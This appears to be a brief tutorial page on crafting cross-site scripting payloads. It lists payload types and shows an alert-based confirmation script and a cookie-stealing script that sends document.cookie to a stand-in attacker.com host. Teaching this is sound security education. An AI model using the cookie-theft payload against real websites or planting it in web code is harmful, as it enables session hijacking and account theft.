Client-Side Attack

Crafting Cross-Site Scripting (XSS) Payloads

Injecting malicious JavaScript to execute client-side scripts.

XSS Payload Types

  • **Confirmation:** Simple alerts to confirm vulnerability.
  • **Cookie Theft:** Stealing session cookies for impersonation.
  • **Defacement:** Modifying web page content.
  • **Redirection:** Redirecting users to malicious sites.
Key Takeaway

XSS payloads allow attackers to execute arbitrary client-side scripts, leading to impacts ranging from vulnerability confirmation to session hijacking.

Simple XSS Confirmation

A basic JavaScript alert is often used to confirm that an XSS vulnerability exists on a web page.

<script>alert('XSSed!');</script>

Stealing Session Cookies

More advanced XSS payloads can extract a victim's session cookie and send it to an attacker-controlled server, enabling session hijacking.

<script>document.location='http://attacker.com/log.php?c='+document.cookie;</script>
